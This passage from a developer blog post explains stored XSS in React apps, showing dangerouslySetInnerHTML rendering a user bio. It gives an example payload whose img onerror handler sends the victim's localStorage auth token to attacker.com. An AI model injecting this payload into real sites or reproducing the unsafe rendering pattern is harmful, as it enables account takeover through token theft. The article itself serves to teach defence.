# Your React App Has Two Silent Killers: XSS and CSRF

> **Author**: CloudCrafter
> **Published**: Apr 22, 2026

---

![image](https://miro.medium.com/v2/resize:fit:700/1*OJsoa7nuFEWkSsEasd3wkw.png)

Member-only story

![CloudCrafter](https://miro.medium.com/v2/resize:fill:64:64/1*yvZYDMaSatKPqDUSxUQrwA.png)

5

Listen

Share

Most developers have heard of them. Few actually understand how they work — until it’s too late.

## Kill #1 — XSS: The Injection

XSS lets an attacker inject malicious code that executes in another user’s browser. Not on your server — in your user’s browser, silently, without any warning.

The everyday culprit in React:

```
<p dangerouslySetInnerHTML={{ __html: user.bio }} />
```

React named it dangerously for a reason. Here’s what happens when you ignore that warning:

```
// What the attacker submits as their "bio"
'Hello! <img src="x" onerror="fetch(
  `https://attacker.com/steal?token=`
  + localStorage.getItem(`authToken`)
)"/>'
```

The moment any other user visits the page — their auth token is silently sent to the attacker’s server. No click needed. No popup. Nothing.

Step by step:

- Attacker submits malicious HTML via any input form
- Your app saves it to the database like any normal content
- Another user loads the page
- Browser executes the injected script
- User data is gone — cookies, tokens, localStorage, everything



---
*Original URL: [https://medium.com/@achrafh/your-react-app-has-two-silent-killers-xss-and-csrf-ade4cd01ede0?source=search_post---------25-----------------------------------](https://medium.com/@achrafh/your-react-app-has-two-silent-killers-xss-and-csrf-ade4cd01ede0?source=search_post---------25-----------------------------------)*
